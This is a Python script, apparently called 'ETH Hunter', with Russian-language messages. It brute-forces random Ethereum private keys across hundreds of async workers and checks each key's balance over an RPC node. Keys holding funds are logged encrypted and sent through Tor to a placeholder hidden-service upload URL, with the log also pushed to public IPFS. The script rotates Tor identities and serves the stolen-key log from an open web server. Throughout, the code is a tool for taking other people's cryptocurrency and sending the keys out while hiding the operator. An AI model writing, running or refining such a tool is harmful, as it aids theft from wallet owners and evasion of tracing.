import asyncio, random, string, os, aiohttp, stem.control, datetime, requests
from aiohttp import web
from eth_account import Account
from cryptography.fernet import Fernet
from web3 import Web3
from aiohttp_socks import ProxyConnector

THREAD_COUNT = int(os.getenv("THREAD_COUNT", 500))
RPC_NODES = [os.getenv("RPC_1"), os.getenv("RPC_2"), os.getenv("RPC_3")]
RPC_URL = next((rpc for rpc in RPC_NODES if rpc), None)
UPLOAD_URL = "http://yourhiddenservice.onion/upload"
ROTATE_INTERVAL = 300

if not RPC_URL:
    print("RPC URL не задан"); exit(1)

if not os.path.exists("log.key"):
    key = Fernet.generate_key()
    with open("log.key", "wb") as f: f.write(key)
else:
    with open("log.key", "rb") as f: key = f.read()

cipher, w3, found_count, last_found_time = Fernet(key), Web3(Web3.HTTPProvider(RPC_URL, request_kwargs={'timeout': 5})), 0, "—"
if not w3.is_connected(): print("Нет RPC подключения"); exit(1)

def random_private_key(): return ''.join(random.choice('0123456789abcdef') for _ in range(64))

async def check_balance(session, address):
    payload = {"jsonrpc":"2.0","method":"eth_getBalance","params":[address,"latest"],"id":random.randint(1,999999)}
    try:
        async with session.post(RPC_URL, json=payload, timeout=5) as r: return int((await r.json()).get("result","0x0"),16)
    except: return 0

async def upload_result(session, data):
    try:
        async with session.post(UPLOAD_URL, data={"data":data}) as r:
            if r.status==200: print("Данные отправлены.")
    except: pass

def upload_to_ipfs(filepath):
    try:
        with open(filepath,'rb') as f:
            r=requests.post('https://ipfs.io/api/v0/add', files={'file':f})
            if r.status_code==200:
                cid=r.json()['Hash']
                print(f'Отправлен в IPFS: https://ipfs.io/ipfs/{cid}')
                return cid
    except Exception as e: print(f'Ошибка IPFS: {e}')
    return None

async def ipfs_pusher():
    while True:
        await asyncio.sleep(600)
        if os.path.exists("found_wallets_secure.log"):
            cid=upload_to_ipfs("found_wallets_secure.log")
            if cid:
                with open("last_ipfs_link.txt","w") as f: f.write(f"https://ipfs.io/ipfs/{cid}")

async def hack_worker(rpc_session, tor_session, worker_id):
    global found_count, last_found_time
    while True:
        pk=random_private_key()
        acct=Account.from_key(pk)
        bal=await check_balance(rpc_session, acct.address)
        if bal>0:
            eth=w3.fromWei(bal,'ether')
            res=f'[Async-{worker_id}] {acct.address}, {eth} ETH, {pk}\n'
            with open("found_wallets_secure.log","ab") as f: f.write(cipher.encrypt(res.encode())+b'\n')
            await upload_result(tor_session, res)
            found_count+=1
            last_found_time=datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        await asyncio.sleep(0.02)

async def tor_rotator():
    while True:
        await asyncio.sleep(ROTATE_INTERVAL)
        try:
            with stem.control.Controller.from_port(port=9051) as c:
                c.authenticate(password="your_control_password")
                c.signal(stem.Signal.NEWNYM)
                print("TOR IDENTITY ROTATED.")
        except Exception as e: print(f"TOR ERROR: {e}")

async def status(request):
    html = f"""<html><head><title>ETH Hunter</title></head><body>
    <h2>Мониторинг ETH Hunter</h2>
    RPC: {'OK' if w3.is_connected() else 'FAIL'}<br>
    Найдено: {found_count}<br>
    Последняя находка: {last_found_time}<br>
    <a href='/log'>Скачать лог</a><br>
    <a href='/ipfs'>IPFS ссылка</a>
    </body></html>"""
    return web.Response(text=html, content_type="text/html")

async def get_log(request):
    return web.FileResponse("found_wallets_secure.log") if os.path.exists("found_wallets_secure.log") else web.Response(text="Лог пуст.")

async def ipfs_link(request):
    if os.path.exists("last_ipfs_link.txt"):
        with open("last_ipfs_link.txt") as f: return web.Response(text=f"Последний IPFS: {f.read()}")
    return web.Response(text="Пока не отправляли.")

async def start_webserver():
    app=web.Application()
    app.router.add_get('/', status)
    app.router.add_get('/log', get_log)
    app.router.add_get('/ipfs', ipfs_link)
    runner=web.AppRunner(app)
    await runner.setup()
    site=web.TCPSite(runner, '0.0.0.0', 8080)
    await site.start()

async def main():
    import aiohttp_socks
    conn_rpc = aiohttp.TCPConnector(ssl=False)
    conn_tor = ProxyConnector(proxy_type="socks5", host="127.0.0.1", port=9050)
    async with aiohttp.ClientSession(connector=conn_rpc) as rpc_session:
        async with aiohttp.ClientSession(connector=conn_tor) as tor_session:
            tasks = [asyncio.create_task(hack_worker(rpc_session, tor_session, i)) for i in range(THREAD_COUNT)]
            tasks += [
                asyncio.create_task(tor_rotator()),
                asyncio.create_task(ipfs_pusher()),
                asyncio.create_task(start_webserver())
            ]
            try:
                await asyncio.gather(*tasks)
            except asyncio.CancelledError:
                print("Работа остановлена пользователем.")


if __name__=="__main__": asyncio.run(main())
